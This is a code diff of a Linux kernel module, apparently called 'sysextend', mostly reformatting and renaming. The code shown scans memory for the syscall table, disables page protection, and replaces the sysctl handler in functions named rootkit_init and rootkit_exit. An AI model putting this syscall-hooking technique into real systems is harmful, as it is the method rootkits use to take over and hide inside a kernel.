@@ -25,7 +25,6 @@ limitations under the License.
 #include <linux/preempt.h>
 #include <asm/cacheflush.h>
 #include <linux/sysctl.h>
-#include <asm/unistd.h>
 
 #include "sysextend_module.h"
 
@@ -47,22 +46,23 @@ asmlinkage long fake_sys_sysctl(struct __sysctl_args *args){
 // find the syscall table
 // Based on:
 // http://stackoverflow.com/questions/13876369/system-call-interception-in-linux-kernel-module-kernel-3-5
+// https://gadgetweb.de/linux/40-how-to-hijacking-the-syscall-table-on
 static unsigned long **find_sys_call_table(void){
-  unsigned long int offset = PAGE_OFFSET;
-  unsigned long **sct;
+	unsigned long int ptr;
+	unsigned long **table;
 
-  while(offset<ULLONG_MAX){
-    sct = (unsigned long **)offset;
+	ptr = PAGE_OFFSET;
+	while(ptr<ULLONG_MAX){
+		table = (unsigned long **)ptr;
 
-		// double check it is the syscall table
-    if((sct[__NR_close] == (unsigned long*)sys_close)){
-      return sct;
+		// check it is the syscall table
+		if((table[__NR_close] == (unsigned long*)sys_close)){
+			return table;
 		}
-
-		offset+=sizeof(void*);
-  }
-  printk("Finding syscall table failed.");
-  return NULL;
+		ptr+=sizeof(void*);
+	}
+	printk("Finding syscall table failed.");
+	return NULL;
 }
 
 // Disable page protections on this core
@@ -92,11 +92,11 @@ int rootkit_init(void){
     return -1;
 	}
 
-  disable_page_protection();
+	disable_page_protection();
 	original_sys_sysctl = (void *)sys_call_table[__NR_sysctl];
 	sys_call_table[__NR_sysctl] = (unsigned long *)fake_sys_sysctl;
-  enable_page_protection();
-  return 0;
+	enable_page_protection();
+	return 0;
 }
 
 void rootkit_exit(void){
@@ -105,8 +105,8 @@ void rootkit_exit(void){
     return;
   }
 
-  disable_page_protection();
-  sys_call_table[__NR_sysctl] = (unsigned long *)original_sys_sysctl;
-  enable_page_protection();
+	disable_page_protection();
+	sys_call_table[__NR_sysctl] = (unsigned long *)original_sys_sysctl;
+	enable_page_protection();
 }
 
